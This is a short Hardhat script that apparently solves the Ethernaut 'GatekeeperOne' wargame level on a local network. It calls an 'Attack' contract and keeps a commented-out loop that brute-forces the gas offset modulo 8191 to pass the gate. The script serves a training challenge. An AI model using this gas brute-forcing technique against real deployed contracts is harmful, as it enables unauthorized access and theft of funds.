const hre = require("hardhat");

async function main() {
 

  const attackAddr="0xFAb604703a674d7d16a72B6d1d93Ac6cCC69fEEC"
  const gatekeeprAddr="0x5FbDB2315678afecb367f032d93F642f64180aa3"

  const Gatekeeper=await hre.ethers.getContractAt("GatekeeperOne",gatekeeprAddr);
  const Attack = await hre.ethers.getContractAt("Attack",attackAddr);
  
  //console.log("Gatekeeper entrant:",await Gatekeeper.entrant())
   // Set gas limit to 500000 (example value, you can adjust as needed)
   

   // Send transaction with manually set gas limit
   await Attack.attack();

   // brute force this using local hardhat network
/* const MOD = 8191
const gasToUse = 800000
for(let i = 0; i < MOD; i++) {
  console.log(`testing ${gasToUse + i}`)
  try {
    tx = await Attack.attack(gasToUse + i, {
      gasLimit: `950000`
    });
    break;
  } catch {}
} */
   
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
